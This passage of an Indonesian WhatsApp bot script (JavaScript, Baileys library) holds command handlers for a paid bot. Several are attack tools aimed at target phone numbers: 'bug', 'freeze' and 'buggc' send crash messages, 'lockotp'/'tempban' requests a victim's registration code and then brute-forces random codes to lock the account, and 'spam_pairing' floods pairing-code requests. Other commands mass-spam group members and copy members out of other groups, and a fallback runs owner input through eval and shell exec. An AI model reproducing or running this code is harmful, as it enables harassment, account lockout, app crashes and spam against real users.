conn.sendButtonVideo(getDATA[i],  [{
   name: "cta_call",
   buttonParamsJson: JSON.stringify({
      display_text: "Panggil",
      phone_number: numberr
   })
}], m, {
   video: global.pushviddeo,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
                  case 'pk16':
                case 'pushkontak16': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|cmd1|cmd2_ \nContoh: .pushkontak16 120363267xxxxxxxxx@g.us|pesan|.menu|.owner`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let cmd1 = qtext.split("|")[2]
let cmd2 = qtext.split("|")[3]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonVideo(getDATA[i],  [{
   name: "single_select",
   buttonParamsJson: JSON.stringify({
      title: "Tap!",
      sections: [{
         rows: [{
            title: cmd1,
            description: ``,
            id: cmd1
         }, {
            title: cmd2,
            description: ``,
            id: cmd2
         }]
      }]
   })
}], m, {
   video: global.pushviddeo,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
            /*
case 'idgc1': {
if (!isCreator) return
reply ('_Tunggu sebentar!!.._')
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `\`LIST  GRUP\`\n\nTotal grup: ${anu.length} Grup\n\n`
for (let x of anu) {
let metadata2 = await conn.groupMetadata(x)
teks += `- Nama: ${metadata2.subject}\n- ID: ${metadata2.id}\n- Member: ${metadata2.participants.length}\n\n`
}
m.reply(teks)
}
break */
case 'idgc1': {
if (!isCreator) return
let gcall = Object.values(await conn.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n\n`
})
m.reply(listgc)
}
break
case 'idgc2': {
//var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
const args = body.trim().split(/ +/).slice(1)
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
conn.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}@g.us`
m.reply(tekse)

})
}
break
case 'depo': {
let tekn = `\n*\`</> List Payment </>\`*\n
Dana: \`0895606059646\`
Gopay: \`xxxxxxxxxx\`
Shopay: \`xxxxxxxxxx\`
Ovo: \`xxxxxxxxxx\`
`
// button text
var hohe = [
              {
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Done Tranfer",
      id: `donetf`
   })
}
]
conn.sendButtonImage(m.chat,  hohe, m, {
   image: "https://telegra.ph/file/39fca2592b2a3bf2ba2d5.jpg",
   body: tekn,
   footer: "_Harap kirimkan bukti transfer agar langsung kami proses_"
})
conn.sendMessage(m.chat, { text: '_Sedang kami proses_' }, {quoted: m })
}
break
case 'donetf': {
let huy = `*\`Message Notifikasi!\`*\nTranfer telah masuk payment\n
*Profil Buyer*
_Nomor;_ ${m.sender.split('@')[0]}
_Name:_ ${pushname}`
conn.sendMessage(global.owner + '@s.whatsapp.net', { text: huy }, {quoted: m })
}
break
//=================================================================

case 'bug1': {
if (!isMurbug) return 
                if (!q) return reply(`Example : ${prefix + command} 91xxxxxxxxxx`)
                let number = q.replace(/[^0-9]/g, '');
                if (number.startsWith('0')) return reply(`Example : ${prefix + command} 91xxxxxxxxxx`)
                let target = number + '@s.whatsapp.net';
                conn.sendMessage(m.chat, {react: {text: "❗", key: m.key}})
                 sendPaymentInfoMessage(target)
                rconn.sendMessage(m.chat, {react: {text: "✅", key: m.key}})
}
break
case 'bug2': {
if (!isMurbug) return 
                if (!q) return reply(`Example : ${prefix + command} 91xxxxxxxxxx`)
                let number = q.replace(/[^0-9]/g, '');
                if (number.startsWith('0')) return reply(`Example : ${prefix + command} 91xxxxxxxxxx`)
                let target = number + '@s.whatsapp.net';
                conn.sendMessage(m.chat, {react: {text: "❗", key: m.key}})
                sendAllBugVIP(target)
                conn.sendMessage(m.chat, {react: {text: "✅", key: m.key}})
}
break
case 'clear': {
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
let clearbug = `_clear_\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n_done_`
reply(clearbug)
await delay(3000)
reply(clearbug)
await delay(3000)
reply(clearbug)
}
break
case 'freeze': {
if (!isMurbug) return 
           if (!q) return reply(`Example : ${prefix + command} 91xxxxxxxxxx`)
                let number = q.replace(/[^0-9]/g, '');
                if (number.startsWith('0')) return reply(`Example : ${prefix + command} 91xxxxxxxxxx`)
                let target = number + '@s.whatsapp.net';
                conn.sendMessage(m.chat, {react: {text: "❗", key: m.key}})
                sendFreezeBug(target)
                conn.sendMessage(m.chat, {react: {text: "✅", key: m.key}})
}
break
case 'buggc': {
if (!isMurbug) return 
const virtexnyaui = "\n".repeat(1) 
let msg = generateWAMessageFromContent(
        m.chat,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: virtexnyaui,
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: virtexnyaui,
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia(
                      { image: { url: thumb } },
                      { upload: conn.waUploadToServer },
                    )),
                }),
                nativeFlowMessage:                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
    name: 'review_and_pay',
    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"0","type":"physical-goods","order":{"status":"payment_requested","subtotal":{"value":0,"offset":100},"order_type":"PAYMENT_REQUEST","items":[{"retailer_id":"item-item-24789f2d-41dc-4a76-88e5-1e178e933db6","name": ©lyosh,"amount":{"value":0,"offset":100},"quantity":1}]},"additional_note":"\n","native_payment_methods":[]}'
  }],
                  }),
                contextInfo: {
                           stanzaId: m.key.id,
                        remoteJid: m.isGroup
                          ? m.sender
                          : m.key.remoteJid,
                        participant: m.key.participant || m.sender,
                        fromMe: m.key.fromMe,
                        quotedMessage: m.message,
                 },
              }),
            },
          },
        },
        {},
      );

      return conn.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });
    }
break
//============================================================

                 case 'idch':
            {
                //const link = text.split(' ')[1];
                if (!qtext) return reply('mana link nya')
                        const channelID = await getChannelIDFromLink(qtext);
                        await conn.sendMessage(m.sender, { text: `ID Saluran: ${channelID}` }, { quoted: m });
                 }
                 break
                 case 'jadibot': {
if (!isMurbug) return reply('Ngapain?')
if (m.key.fromMe) return
jadibot(conn, m, m.chat)
}
break
case 'lockotp': case 'tempban': {
if (!isMurbug) return reply('Ngapain?')
  if (args.length < 1) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 62|871717171`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 62|71717171`);
  const IDCountry = args2[0];
  const IDTarget = args2[1];
  const IDNumber = IDTarget.replace('@s.whatsapp.net', '');
  const xeonmerge = `${IDCountry}${IDTarget}`
  reply(`Sukses mengirimkan ${command} dinomor ${IDNumber}`)
  try {
    const { stateRxhL, saveCredsRxhL } = await useMultiFileAuthState('./session');
    const rxhlRequest = await conn.requestRegistrationCode({
      phoneNumber: '+' + IDCountry + `${IDTarget}`,
      phoneNumberCountryCode: IDCountry,
      phoneNumberNationalNumber: `${IDNumber}`,
      phoneNumberMobileCountryCode: 510,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var xeonPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await conn.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
      console.log(`${xeonPrefix}-${xeonSuffix}`);
      await sleep(100000)
    }
  }
}
break;
case 'spam_pairing': {
if (!isMurbug) return reply('Ngapain?')
  if (args.length < 1) return reply(`${prefix + command} 6289xxx|jumlah\nExample: ${prefix + command} 628992618367|5`)
  const args2 = args[0].split('|');
  if (args2.length !== 2) return reply(`${prefix + command} 6289xxx|jumlah\nExample: ${prefix + command} 628992618367|5`)
  const IDNomor = args2[0];
  const IDJumlah = args2[1];
const Pino = require('pino')
 async function spam(nomor, jumlah) {
    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    const auth = await useMultiFileAuthState("auth");
    const spam = makeWASocket({
        printQRInTerminal: false,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: auth.state,
        logger: Pino({ level: "silent" }),
    });

    if (!nomor) {
        reply('Masukkan nomor yang valid.');
        return;
    }

    const phoneNumber = nomor.replace(/\s|-|\+/g, "").trim();

    if (isNaN(jumlah) || jumlah <= 0) {
        reply('Jumlah harus berupa angka positif.');
        return;
    }

    // Spam ke nomor yang ditargetkan
    for (let i = 0; i < jumlah; i++) {
        try {
            conn.sendMessage(m.chat, {react: {text: "❗", key: m.key}})
            await delay(5000); // jeda 3 detik antar request
            const code = await spam.requestPairingCode(phoneNumber);
            console.log(`Spam ke ${phoneNumber} [${i + 1}/${jumlah}] Kode: ${code}`);
            conn.sendMessage(m.chat, {react: {text: "✅", key: m.key}})
           } catch (err) {
            reply(`Gagal mengirim spam ke ${phoneNumber}:`, err.message);
        }
    }
}
 let jumlahspam = qtext.split(',');
 return spam(IDNomor, IDJumlah);
}
break
case 'stopjadibot': {
if (!isMurbug) return 
if (m.key.fromMe) return
stopjadibot(conn, m, m.chat)
}
break

case 'listjadibot': {
if (!isMurbug) return 
if (m.key.fromMe) return
listjadibot(conn, m)
}
break
case 'pphgp':{
//if (!isRegistered) return registerbut(noregis)
let u = `  ⟣────────────`
let list1 = `• *${monospa('Paket [ 1 ]')}* 📦

> _RAM 4 GB_
> _DIKS 4190_
> _CPU 350%_
> _5K BULAN_`
let list2 = `• *${monospa('Paket [ 2 ]')}* 📦

> _RAM 5 GB_
> _DIKS 5190_
> _CPU 450%_
> _7K BULAN_`
let list3 = `• *${monospa('Paket [ 3 ]')}* 📦

> _RAM 6 GB_
> _DIKS 6190_
> _CPU 550%_
> _8K BULAN_`
let list4 = `• *${monospa('Paket [ 4 ]')}* 📦

> _RAM 7 GB_
> _DIKS 7190_
> _CPU 650%_
> _10K BULAN_ `
let list5 = `• *${monospa('Paket [ 5 ]')}* 📦

> _RAM 8 GB_
> _DIKS 8190_
> _CPU ∞%_
> _12K BULAN_`
let list6 = `• *${monospa('Paket [ 6 ]')}* 📦

> _RAM 9 GB_
> _DIKS O190_
> _CPU ∞%_
> _14K BULAN_`
let list7 = `• *${monospa('Paket [ 7 ]')}* 📦

> _RAM ∞ GB_
> _DIKS ∞_
> _CPU ∞%_
> _20K BULAN_`
let mmm = `
◦ Ram Vps : 8gb
◦ Core Vps : 8
◦ Garansi : 4 Day
◦ Terawat : ✓
◦ Anti Maling : ✓`
let info = `${monospace(mmm)}`
reply("_Please wait_")
  const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
      contextInfo: {
        	mentionedJid: [m.sender], 
        	isForwarded: true, 
	        forwardedNewsletterMessageInfo: {
			newsletterJid: '0@newsletter',
			newsletterName: 'Lyosh Only', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: conn.decodeJid(conn.user.id) },
	forwardingScore: 256,
            externalAdReply: {  
                title: 'kym -CMD', 
                thumbnailUrl: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg', 
                sourceUrl: 'https://tiktok.com/@adeljkt48',
                mediaType: 2,
                renderLargerThumbnail: false
            }
          }, 
        body: proto.Message.InteractiveMessage.Body.fromObject({
        text: 'List Panel',
        }), 
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: false
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${list1}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: conn.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Buy Sever!.. 🐣",
      id: ".buy"
   }),
}
                  ]
              })
            },
            // BATAS CLONE KODE
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ''
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${list2}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: conn.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: `Buy Sever!.. 🐣`,
      id: `.buy`
   }),
}
                  ]
              })
            },
            // BATAS CLONE KODE
                        {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ''
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${list3}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: conn.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: `Buy Sever!.. 🐣`,
      id: `.buy`
   }),
}
                  ]
              })
            },
                                    {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ''
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${list4}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: conn.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: `Buy Sever!.. 🐣`,
      id: `.buy`
   }),
}
                  ]
              })
            },
                                    {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ''
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${list5}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: conn.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: `Buy Sever!.. 🐣`,
      id: `.buy`
   }),
}
                  ]
              })
            },
                                    {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ''
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${list6}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: conn.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: `Buy Sever!..`,
      id: `.buy`
   }),
}
                  ]
              })
            },
                                    {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ''
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `${u}\n\n${list7}\n\n${info}`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: conn.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: `Buy Sever!..`,
      id: `.buy`
   }),
}
                  ]
              })
            }
          ]
        })
      })
    }
  }
}, { userJid: m.chat, quoted: m })
conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break
case 'lyosh_disini': {
if (!isCreator) return 
if (m.isGroup) return
const buttz = [
       {
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Lihat",
      id: `bshop`
   })
}
]
conn.sendButtonImage(from, buttz, VerifQuoted,{
 image: 'https://i.imghippo.com/files/0qE5q1727624360.jpg',
body: "",
   footer: "\n  _*Daftar shop yang kami punya ツ*_"
   })
}
break
case 'bshop': {
let hom = `_@Lyosh_
> *List Privat Panel WhatsApp!!*

*\`• Privat Panel\` 🪅*
   ◦ Ram : 16gb
   ◦ Core : 8
   ◦ Garansi : 30 Full Day

\`• Daftar Paket 1\`  🔖
Memory: 4GB | Rp 3,000 Bulan
\`• Daftar Paket 2\`  🔖
Memory: 5GB | Rp 4,000 Bulan
\`• Daftar Paket 3\`  🔖
Memory: 6GB | Rp 6,000 Bulan
\`• Daftar Paket 4\`  🔖
Memory: 7GB | Rp 8,000 Bulan
\`• Daftar Paket 5\`  🔖
Memory: 8GB | Rp 10,000 Bulan
\`• Daftar Paket 6\`  🔖
Memory: 9GB | Rp 12,000 Bulan
\`• Daftar Paket 7\` 🔖
Memory: ∞ GB | Rp 15,000 Bulan

\`Free script\` 
_xeon latest_
_paktzy latest_
_xhiro latest_
_dll_

*My Contact 👤*
• https://wa.me/6285727785143
• https://t.me/lyossh`
 conn.sendMessage(from, { caption: hom, image: { url: "https://i.imghippo.com/files/7OdLs1727613711.png" }}, {quoted:VerifQuoted})
}
break
case 'done': {
if (!isCreator) return 
if (!m.isGroup) return 
if (!isBotAdmins) return 
if (!isAdmins) return 
const froms = m.quoted ? m.quoted.sender : qtext ? (qtext.replace(/[^0-9]/g, '') ? qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
if (!froms) return 
if (froms.startsWith('08')) return 
var cek = await conn.onWhatsApp(froms)
if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
let add = await conn.groupParticipantsUpdate(from, [froms], "add")
}
break
case 'culikmember1': {
    if (!isCreator) return reply('*Only Vip*')
    if (!m.isGroup) return reply(global.noingroup)
    if (!qtext) return reply(`idnya?`)
    let metaDATA = await conn.groupMetadata(qtext).catch((e) => console.error('Error:', e));

    if (!metaDATA) {
        reply('Metadata grup tidak ditemukan.');
        return;
    }

    function dele(ms) {
        return new Promise((resolve, reject) => setTimeout(resolve, ms))
    }

    // Mengambil ID anggota grup
    let memberIDs = metaDATA.participants.map(v => v.id); // Mengambil semua ID anggota grup

    // Menampilkan nomor anggota grup
    let i = 0, er = 0
    reply('Tunggu proses!!..')
    for (let id of memberIDs) {
    try {
       let add = await conn.groupParticipantsUpdate(from, [id], "add");
       i += 1
       } catch (e) {
       console.log(e)
       er += 1
       }
         await dele(5000)      
         
    };

    reply(`Sukses menambahkan ${i} member & gagal menambahkan ${er} member`)
}
break

case 'culikmember2': {
if (!isCreator) return reply('*Only Vip*')
if (!m.isGroup) return reply(global.noingroup)
if (!qtext) return reply(`idnya?`)
let metaDATA = await conn.groupMetadata(qtext).catch((e) => console.error('Error:', e));

if (!metaDATA) {
    console.log('Metadata grup tidak ditemukan.');
    return;
}

// Mengambil ID anggota grup
let memberIDs = metaDATA.participants.map(v => v.id);  // Mengambil semua ID anggota grup

// Menampilkan nomor anggota grup
reply('Tunggu proses!!..')
for (let id of memberIDs) {
    let formattedID = id.replace('@s.whatsapp.net', '');
    // Tampilkan ID yang sedang diproses ke console
   // reply(`Proses menambahkan: ${formattedID}`);
    await new Promise(resolve => setTimeout(resolve, 4000));
    conn.sendMessage(m.chat, { text: 'done ' + formattedID }, {quoted: m })
};

reply('Proses selesai!!..')
        }
break
default:
if (budy.startsWith('=>')) {
if (!isCreator) return reply('*Only Vip*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}

}
} catch (err) {
    setTimeout(() => {
        conn.sendMessage(owner + "@s.whatsapp.net", {text: require('util').format(err)}, {quoted: m});
        console.log('\x1b[1;31m'+err+'\x1b[0m');
    }, 5000); // Menunggu 5 detik sebelum mengirim pesan dan mencetak error
}

}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})

